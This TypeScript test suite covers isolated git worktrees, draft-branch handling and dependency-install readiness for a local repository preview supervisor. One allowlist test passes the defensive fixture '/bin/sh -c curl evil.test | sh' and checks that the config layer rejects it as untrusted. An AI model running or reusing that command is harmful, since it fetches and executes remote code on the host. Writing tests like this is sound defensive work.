// Phase 17 lifecycle head — the isolated branch/worktree.
//
// The supervisor already proves start → health → logs → stop → restart against
// a trusted checkout. What was missing is the step BEFORE that in the plan's
// acceptance path: "select an authorised project → create/resume its isolated
// branch/worktree". These tests drive real `git` against real temporary
// repositories, because the whole point is what git actually does with a
// second worktree on a draft branch.
//
// The contract being pinned:
//   • create   — a fresh project gets its own worktree on `aqua-editor/<id>`
//   • retain   — an uncommitted edit survives a preview stop/restart cycle
//   • isolate  — the shared checkout never sees the draft branch's edit
//   • resume   — a second ensure() reuses the worktree, never re-creates it
//   • two projects — separate worktrees, separate branches, no interference
//   • refuse   — a hijacked/foreign-branch directory is a refusal, NOT a delete
//   • contain  — nothing is ever written outside the trusted preview root

import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from "node:fs/promises";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import path from "node:path";
import { promisify } from "node:util";
import { after, before, describe, it } from "node:test";

const require = createRequire(import.meta.url);
const serverOnlyPath = require.resolve("server-only");
require.cache[serverOnlyPath] = {
  id: serverOnlyPath,
  filename: serverOnlyPath,
  loaded: true,
  exports: {},
  paths: [],
  children: [],
} as never;

const run = promisify(execFile);

type WorktreeModule = typeof import("../src/lib/server/dev/localRepositoryPreviewWorktree");
type SupervisorModule = typeof import("../src/lib/server/dev/localRepositoryPreviewSupervisor");
type DevProject = import("../src/server/types").DevProject;

let worktreeModule: WorktreeModule;
let supervisorModule: SupervisorModule;
let tempRoot = "";

async function git(cwd: string, ...args: string[]): Promise<string> {
  const { stdout } = await run("git", args, { cwd, env: { ...process.env, GIT_TERMINAL_PROMPT: "0" } });
  return stdout.trim();
}

/**
 * A real single-commit repository — the "trusted checkout" the record points
 * at. Realpathed like the config layer does, so path containment assertions
 * compare physical paths (macOS temp dirs are symlinks: /var → /private/var).
 */
async function repository(name: string): Promise<string> {
  const created = path.join(tempRoot, name);
  await mkdir(created, { recursive: true });
  const directory = await realpath(created);
  await git(directory, "init", "--initial-branch=main");
  await git(directory, "config", "user.email", "preview@aqua.test");
  await git(directory, "config", "user.name", "Aqua Preview Smoke");
  await git(directory, "config", "commit.gpgsign", "false");
  await writeFile(path.join(directory, "index.html"), "<h1>original</h1>\n", "utf8");
  await git(directory, "add", "index.html");
  await git(directory, "commit", "-m", "initial");
  return directory;
}

function project(id: string): DevProject {
  return {
    id,
    agencyId: "agency_preview",
    name: id,
    kind: "software",
    repository: `fixture/${id}`,
    ref: "main",
    createdBy: "user_preview",
    updatedBy: "user_preview",
    createdAt: 1,
    updatedAt: 1,
  };
}

before(async () => {
  worktreeModule = await import("../src/lib/server/dev/localRepositoryPreviewWorktree");
  supervisorModule = await import("../src/lib/server/dev/localRepositoryPreviewSupervisor");
  tempRoot = await mkdtemp(path.join(tmpdir(), "aqua-preview-worktree-"));
});

after(async () => {
  // Registered worktrees must be released before the directories go, or git
  // leaves administrative files behind in the fixture repositories.
  await rm(tempRoot, { recursive: true, force: true }).catch(() => undefined);
});

describe("isolated preview worktree — create, resume, retain", () => {
  it("creates the project's own worktree on its draft branch, leaving the shared checkout untouched", async () => {
    const checkout = await repository("create-repo");
    const { ensureIsolatedPreviewWorktree, ISOLATED_PREVIEW_BRANCH_PREFIX } = worktreeModule;

    const isolated = await ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_alpha" });

    assert.equal(isolated.created, true);
    assert.equal(isolated.branch, `${ISOLATED_PREVIEW_BRANCH_PREFIX}proj_alpha`);
    assert.ok(isolated.previewPath.startsWith(checkout), "the worktree lives inside the trusted preview root");
    assert.equal((await stat(isolated.previewPath)).isDirectory(), true);
    assert.equal(await git(isolated.previewPath, "rev-parse", "--abbrev-ref", "HEAD"), isolated.branch);
    assert.equal(await git(checkout, "rev-parse", "--abbrev-ref", "HEAD"), "main",
      "the shared checkout stays on its own branch");
    assert.equal(
      await readFile(path.join(isolated.previewPath, "index.html"), "utf8"),
      "<h1>original</h1>\n",
      "the draft branch starts from the repository's content",
    );
  });

  it("resumes the same worktree and RETAINS an uncommitted edit; the shared checkout never sees it", async () => {
    const checkout = await repository("retain-repo");
    const { ensureIsolatedPreviewWorktree } = worktreeModule;

    const first = await ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_retain" });
    // The edit an operator would make in the editor — uncommitted on purpose.
    await writeFile(path.join(first.previewPath, "index.html"), "<h1>edited in the editor</h1>\n", "utf8");

    const second = await ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_retain" });
    assert.equal(second.created, false, "a second ensure resumes rather than re-creating");
    assert.equal(second.previewPath, first.previewPath);
    assert.equal(
      await readFile(path.join(second.previewPath, "index.html"), "utf8"),
      "<h1>edited in the editor</h1>\n",
      "the exact change is retained across the restart boundary",
    );
    assert.equal(
      await readFile(path.join(checkout, "index.html"), "utf8"),
      "<h1>original</h1>\n",
      "the shared checkout is never mutated by an editor session",
    );
  });

  it("gives two projects separate worktrees and branches that cannot see each other's edits", async () => {
    const checkout = await repository("two-projects-repo");
    const { ensureIsolatedPreviewWorktree } = worktreeModule;

    const a = await ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_a" });
    const b = await ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_b" });

    assert.notEqual(a.previewPath, b.previewPath);
    assert.notEqual(a.branch, b.branch);
    await writeFile(path.join(a.previewPath, "index.html"), "<h1>A only</h1>\n", "utf8");
    assert.equal(
      await readFile(path.join(b.previewPath, "index.html"), "utf8"),
      "<h1>original</h1>\n",
      "project B cannot observe project A's working change",
    );
  });

  it("recovers when the worktree directory was deleted by hand (prune, then re-create on the same branch)", async () => {
    const checkout = await repository("prune-repo");
    const { ensureIsolatedPreviewWorktree } = worktreeModule;

    const first = await ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_prune" });
    await writeFile(path.join(first.previewPath, "kept.txt"), "committed\n", "utf8");
    await git(first.previewPath, "add", "kept.txt");
    await git(first.previewPath, "-c", "user.email=p@aqua.test", "-c", "user.name=P", "commit", "-m", "draft work");
    await rm(first.previewPath, { recursive: true, force: true });

    const second = await ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_prune" });
    assert.equal(second.created, true);
    assert.equal(second.branch, first.branch);
    assert.equal(
      await readFile(path.join(second.previewPath, "kept.txt"), "utf8"),
      "committed\n",
      "committed draft work comes back with the branch",
    );
  });
});

describe("isolated preview worktree — refusals never destroy", () => {
  it("refuses a hijacked directory instead of deleting or checking out over it", async () => {
    const checkout = await repository("hijack-repo");
    const { ensureIsolatedPreviewWorktree, ISOLATED_WORKTREES_DIRECTORY } = worktreeModule;

    const squatted = path.join(checkout, ISOLATED_WORKTREES_DIRECTORY, "proj_squat");
    await mkdir(squatted, { recursive: true });
    await writeFile(path.join(squatted, "precious.txt"), "do not delete me\n", "utf8");

    await assert.rejects(
      () => ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_squat" }),
      (error: Error & { code?: string }) => {
        assert.equal(error.name, "LocalRepositoryPreviewWorktreeError");
        assert.equal(error.code, "worktree-conflict");
        return true;
      },
    );
    assert.equal(
      await readFile(path.join(squatted, "precious.txt"), "utf8"),
      "do not delete me\n",
      "a refusal must leave the operator's files exactly as they were",
    );
  });

  it("refuses a worktree parked on the wrong branch rather than moving it", async () => {
    const checkout = await repository("wrong-branch-repo");
    const { ensureIsolatedPreviewWorktree, ISOLATED_WORKTREES_DIRECTORY } = worktreeModule;

    const target = path.join(checkout, ISOLATED_WORKTREES_DIRECTORY, "proj_wrong");
    await git(checkout, "worktree", "add", "-b", "somebody-elses-branch", target);
    await writeFile(path.join(target, "theirs.txt"), "their work\n", "utf8");

    await assert.rejects(
      () => ensureIsolatedPreviewWorktree({ configuredPath: checkout, projectId: "proj_wrong" }),
      (error: Error & { code?: string }) => error.code === "worktree-conflict",
    );
    assert.equal(await git(target, "rev-parse", "--abbrev-ref", "HEAD"), "somebody-elses-branch");
    assert.equal(await readFile(path.join(target, "theirs.txt"), "utf8"), "their work\n");
  });

  it("refuses a trusted path that is not a git repository at all", async () => {
    const plain = path.join(tempRoot, "not-a-repo");
    await mkdir(plain, { recursive: true });
    await assert.rejects(
      () => worktreeModule.ensureIsolatedPreviewWorktree({ configuredPath: plain, projectId: "proj_plain" }),
      (error: Error & { code?: string }) => error.code === "not-a-repository",
    );
  });
});

describe("supervisor integration — the trusted record drives isolation", () => {
  const { LocalRepositoryPreviewSupervisor } = (() => supervisorModule ?? ({} as SupervisorModule))() as SupervisorModule;

  function scope(projectId: string) {
    return { projectId, realmId: "live", agencyId: "agency_preview" };
  }

  it("starts the preview inside the isolated worktree, not the shared checkout", async () => {
    const checkout = await repository("supervisor-isolated-repo");
    let spawnedCwd = "";
    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
      resolveConfig: async () => ({
        worktreePath: checkout,
        command: process.execPath,
        args: ["--version"],
        healthPath: "/",
        startupTimeoutMs: 200,
        healthPollIntervalMs: 20,
        env: {},
        isolatedWorktrees: true,
        source: "test fixture",
      }),
      ensureIsolatedWorktree: async input => {
        const isolated = await worktreeModule.ensureIsolatedPreviewWorktree(input);
        spawnedCwd = isolated.previewPath;
        return isolated;
      },
      allocatePort: async () => 45_999,
      probeHealth: async () => false,
      isProduction: () => false,
    });

    const snapshot = await supervisor.start(scope("proj_supervised"), project("proj_supervised"));
    assert.notEqual(snapshot.state, "configuration-error");
    assert.ok(spawnedCwd.startsWith(checkout), "the child runs inside the trusted preview root");
    assert.notEqual(spawnedCwd, checkout, "the child must not run in the shared checkout");
    await supervisor.stop(scope("proj_supervised"));
  });

  it("reports a worktree refusal as a configuration error with the operator sentence, and starts nothing", async () => {
    const checkout = await repository("supervisor-refusal-repo");
    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
      resolveConfig: async () => ({
        worktreePath: checkout,
        command: process.execPath,
        args: ["--version"],
        healthPath: "/",
        startupTimeoutMs: 200,
        healthPollIntervalMs: 20,
        env: {},
        isolatedWorktrees: true,
        source: "test fixture",
      }),
      ensureIsolatedWorktree: async () => {
        throw new worktreeModule.LocalRepositoryPreviewWorktreeError(
          "worktree-conflict",
          "The project's isolated worktree is on \"other\" instead of its draft branch. Move it aside; nothing is deleted automatically.",
        );
      },
      allocatePort: async () => { throw new Error("a refused worktree must never reach port allocation"); },
      probeHealth: async () => false,
      isProduction: () => false,
    });

    const snapshot = await supervisor.start(scope("proj_refused"), project("proj_refused"));
    assert.equal(snapshot.state, "configuration-error");
    assert.match(snapshot.error ?? "", /nothing is deleted automatically/);
    assert.equal(snapshot.previewUrl, undefined);
  });

  it("leaves a record without the flag on the shared checkout (no behaviour change by default)", async () => {
    const checkout = await repository("supervisor-shared-repo");
    let isolationAttempted = false;
    let spawnedCwd = "";
    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
      resolveConfig: async () => ({
        worktreePath: checkout,
        command: process.execPath,
        args: ["--version"],
        healthPath: "/",
        startupTimeoutMs: 200,
        healthPollIntervalMs: 20,
        env: {},
        source: "test fixture",
      }),
      ensureIsolatedWorktree: async input => {
        isolationAttempted = true;
        return worktreeModule.ensureIsolatedPreviewWorktree(input);
      },
      allocatePort: async () => { spawnedCwd = checkout; return 45_998; },
      probeHealth: async () => false,
      isProduction: () => false,
    });

    await supervisor.start(scope("proj_shared"), project("proj_shared"));
    assert.equal(isolationAttempted, false, "isolation is opt-in through the trusted record only");
    assert.equal(spawnedCwd, checkout);
    await supervisor.stop(scope("proj_shared"));
  });

  void LocalRepositoryPreviewSupervisor;
});

describe("dependency readiness — install once, log it, fail closed", () => {
  /**
   * A real install command: a Node script that records each invocation and
   * writes the "installed" artefact. Using the actual runner proves the
   * fingerprint/marker contract rather than a mocked promise.
   */
  async function installFixture(
    worktree: string,
    recordPath: string,
    mode: "ok" | "fail" | "hang" = "ok",
  ): Promise<string> {
    const script = path.join(worktree, "fixture-install.cjs");
    await writeFile(script, `
const fs = require("node:fs");
fs.appendFileSync(${JSON.stringify(recordPath)}, "ran\\n");
console.log("fixture install output line");
if (${JSON.stringify(mode)} === "fail") { console.error("dependency resolution exploded"); process.exit(3); }
if (${JSON.stringify(mode)} !== "hang") {
  fs.mkdirSync(require("node:path").join(process.cwd(), "node_modules"), { recursive: true });
} else {
  setInterval(() => {}, 1000);
}
`, "utf8");
    return script;
  }

  it("installs once, then SKIPS on resume while the lockfile is unchanged", async () => {
    const checkout = await repository("install-once-repo");
    const isolated = await worktreeModule.ensureIsolatedPreviewWorktree({
      configuredPath: checkout,
      projectId: "proj_install",
    });
    const record = path.join(tempRoot, "install-once.log");
    const script = await installFixture(isolated.previewPath, record);
    await writeFile(record, "", "utf8");
    await writeFile(path.join(isolated.previewPath, "package.json"), '{"name":"fixture","version":"1.0.0"}\n', "utf8");

    const logs: string[] = [];
    const input = {
      worktreePath: isolated.previewPath,
      command: process.execPath,
      args: [script],
      timeoutMs: 20_000,
      log: (text: string) => logs.push(text),
    };

    const first = await worktreeModule.ensureDependenciesInstalled(input);
    assert.equal(first.ok, true);
    assert.equal(first.ok && first.ran, true, "the first start installs");
    assert.ok(logs.some(line => line.includes("fixture install output line")),
      "the install's own output reaches the operator log");
    assert.ok(logs.some(line => /Dependencies are ready/.test(line)));

    const second = await worktreeModule.ensureDependenciesInstalled(input);
    assert.equal(second.ok, true);
    assert.equal(second.ok && second.ran, false, "an unchanged lockfile must not reinstall");
    assert.equal((await readFile(record, "utf8")).trim().split("\n").filter(Boolean).length, 1);

    // A changed dependency declaration must always reinstall.
    await writeFile(path.join(isolated.previewPath, "package.json"), '{"name":"fixture","version":"2.0.0"}\n', "utf8");
    const third = await worktreeModule.ensureDependenciesInstalled(input);
    assert.equal(third.ok && third.ran, true, "a changed package.json reinstalls");
    assert.equal((await readFile(record, "utf8")).trim().split("\n").filter(Boolean).length, 2);
  });

  it("reports a failing install as a refusal and does NOT record readiness", async () => {
    const checkout = await repository("install-fail-repo");
    const isolated = await worktreeModule.ensureIsolatedPreviewWorktree({
      configuredPath: checkout,
      projectId: "proj_install_fail",
    });
    const record = path.join(tempRoot, "install-fail.log");
    const script = await installFixture(isolated.previewPath, record, "fail");
    await writeFile(record, "", "utf8");

    const logs: string[] = [];
    const input = {
      worktreePath: isolated.previewPath,
      command: process.execPath,
      args: [script],
      timeoutMs: 20_000,
      log: (text: string) => logs.push(text),
    };

    const failed = await worktreeModule.ensureDependenciesInstalled(input);
    assert.equal(failed.ok, false);
    assert.match(failed.ok ? "" : failed.reason, /exit code 3/);
    assert.ok(logs.some(line => line.includes("dependency resolution exploded")),
      "the failure's own output is shown, not swallowed");

    // A failed install must be retried next time, never treated as ready.
    const retried = await worktreeModule.ensureDependenciesInstalled(input);
    assert.equal(retried.ok, false);
    assert.equal((await readFile(record, "utf8")).trim().split("\n").filter(Boolean).length, 2);
  });

  it("bounds a hanging install instead of blocking the preview forever", async () => {
    const checkout = await repository("install-hang-repo");
    const isolated = await worktreeModule.ensureIsolatedPreviewWorktree({
      configuredPath: checkout,
      projectId: "proj_install_hang",
    });
    const record = path.join(tempRoot, "install-hang.log");
    const script = await installFixture(isolated.previewPath, record, "hang");
    await writeFile(record, "", "utf8");

    const outcome = await worktreeModule.ensureDependenciesInstalled({
      worktreePath: isolated.previewPath,
      command: process.execPath,
      args: [script],
      timeoutMs: 700,
      log: () => {},
    });
    assert.equal(outcome.ok, false);
    assert.match(outcome.ok ? "" : outcome.reason, /did not finish inside 700ms/);
  });

  it("refuses a missing install runtime with a named reason", async () => {
    const checkout = await repository("install-missing-repo");
    await assert.rejects(
      () => worktreeModule.ensureDependenciesInstalled({
        worktreePath: checkout,
        command: path.join(checkout, "does-not-exist"),
        args: [],
        timeoutMs: 5_000,
      }),
      (error: Error & { code?: string }) => {
        assert.equal(error.code, "install-unavailable");
        return true;
      },
    );
  });
});

describe("dependency readiness — the supervisor's install state", () => {
  function scope(projectId: string) {
    return { projectId, realmId: "live", agencyId: "agency_preview" };
  }

  function configWith(worktreePath: string, extra: Record<string, unknown>) {
    return {
      worktreePath,
      command: process.execPath,
      args: ["--version"],
      installArgs: [],
      installTimeoutMs: 5_000,
      healthPath: "/",
      startupTimeoutMs: 200,
      healthPollIntervalMs: 20,
      env: {},
      source: "test fixture",
      ...extra,
    };
  }

  it("runs the declared install before spawning, and reports install-failed without starting a server", async () => {
    const checkout = await repository("supervisor-install-fail-repo");
    let allocated = false;
    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
      resolveConfig: async () => configWith(checkout, { installCommand: process.execPath, isolatedWorktrees: false }) as never,
      ensureDependencies: async () => ({ ok: false as const, reason: "The project's dependency install failed with exit code 3." }),
      allocatePort: async () => { allocated = true; return 45_997; },
      probeHealth: async () => false,
      isProduction: () => false,
    });

    const snapshot = await supervisor.start(scope("proj_inst_fail"), project("proj_inst_fail"));
    assert.equal(snapshot.state, "install-failed");
    assert.match(snapshot.error ?? "", /exit code 3/);
    assert.equal(allocated, false, "a failed install must never reach port allocation or spawn");
    assert.equal(snapshot.previewUrl, undefined);
  });

  it("skips the install step entirely when the trusted record declares none", async () => {
    const checkout = await repository("supervisor-no-install-repo");
    let attempted = false;
    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
      resolveConfig: async () => configWith(checkout, {}) as never,
      ensureDependencies: async () => { attempted = true; return { ok: true as const, ran: false, fingerprint: "x" }; },
      allocatePort: async () => 45_996,
      probeHealth: async () => false,
      isProduction: () => false,
    });

    await supervisor.start(scope("proj_no_inst"), project("proj_no_inst"));
    assert.equal(attempted, false, "dependency readiness is opt-in through the trusted record");
    await supervisor.stop(scope("proj_no_inst"));
  });

  it("passes the isolated worktree — not the shared checkout — to the install command", async () => {
    const checkout = await repository("supervisor-install-cwd-repo");
    let installedIn = "";
    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
      resolveConfig: async () => configWith(checkout, {
        installCommand: process.execPath,
        isolatedWorktrees: true,
      }) as never,
      ensureIsolatedWorktree: input => worktreeModule.ensureIsolatedPreviewWorktree(input),
      ensureDependencies: async input => {
        installedIn = input.worktreePath;
        return { ok: true as const, ran: true, fingerprint: "x" };
      },
      allocatePort: async () => 45_995,
      probeHealth: async () => false,
      isProduction: () => false,
    });

    await supervisor.start(scope("proj_inst_cwd"), project("proj_inst_cwd"));
    assert.ok(installedIn.startsWith(checkout));
    assert.notEqual(installedIn, checkout, "dependencies belong to the project's own worktree");
    await supervisor.stop(scope("proj_inst_cwd"));
  });
});

describe("dependency readiness — never into the shared checkout", () => {
  it("refuses a record that declares an install command without isolated worktrees", async () => {
    const checkout = await repository("install-isolation-guard-repo");
    const { resolveTrustedLocalRepositoryPreview } = await import(
      "../src/lib/server/dev/localRepositoryPreviewConfig"
    );

    await assert.rejects(
      () => resolveTrustedLocalRepositoryPreview(project("proj_guard"), {
        records: [{
          projectIds: ["proj_guard"],
          worktreePath: checkout,
          command: "node",
          args: ["--version"],
          installCommand: "npm",
          installArgs: ["install"],
          // isolatedWorktrees deliberately absent — this is the dangerous shape.
        }],
        safeRoots: [checkout],
      }),
      (error: Error & { code?: string }) => {
        assert.equal(error.code, "install-requires-isolation");
        assert.match(error.message, /shared checkout is refused/);
        return true;
      },
    );
  });

  it("accepts the same record once it opts into isolated worktrees", async () => {
    const checkout = await repository("install-isolation-ok-repo");
    const { resolveTrustedLocalRepositoryPreview } = await import(
      "../src/lib/server/dev/localRepositoryPreviewConfig"
    );

    const resolved = await resolveTrustedLocalRepositoryPreview(project("proj_guard_ok"), {
      records: [{
        projectIds: ["proj_guard_ok"],
        worktreePath: checkout,
        command: "node",
        args: ["--version"],
        installCommand: "npm",
        installArgs: ["install", "--no-audit"],
        isolatedWorktrees: true,
      }],
      safeRoots: [checkout],
    });

    assert.equal(resolved.isolatedWorktrees, true);
    assert.equal(resolved.installCommand, "npm");
    assert.deepEqual(resolved.installArgs, ["install", "--no-audit"]);
    assert.equal(resolved.installTimeoutMs, 300_000, "an undeclared install timeout falls back to the bounded default");
  });

  it("holds the same allowlist for the install command as for the launch command", async () => {
    const checkout = await repository("install-allowlist-repo");
    const { resolveTrustedLocalRepositoryPreview } = await import(
      "../src/lib/server/dev/localRepositoryPreviewConfig"
    );

    await assert.rejects(
      () => resolveTrustedLocalRepositoryPreview(project("proj_shell"), {
        records: [{
          projectIds: ["proj_shell"],
          worktreePath: checkout,
          command: "node",
          args: ["--version"],
          installCommand: "/bin/sh",
          installArgs: ["-c", "curl evil.test | sh"],
          isolatedWorktrees: true,
        }],
        safeRoots: [checkout],
      }),
      (error: Error & { code?: string }) => error.code === "untrusted-command",
    );
  });

  it("leaves the committed AquaCRM manifest free of an install command (it is not isolated)", async () => {
    const manifest = JSON.parse(await readFile(path.join(process.cwd(), "aqua-preview.config.json"), "utf8")) as {
      installCommand?: string;
      isolatedWorktrees?: boolean;
    };
    assert.equal(manifest.installCommand, undefined,
      "the shared-checkout lane must never carry an install command");
    assert.notEqual(manifest.isolatedWorktrees, true,
      "if this flips, revisit the install declaration deliberately");
  });
});
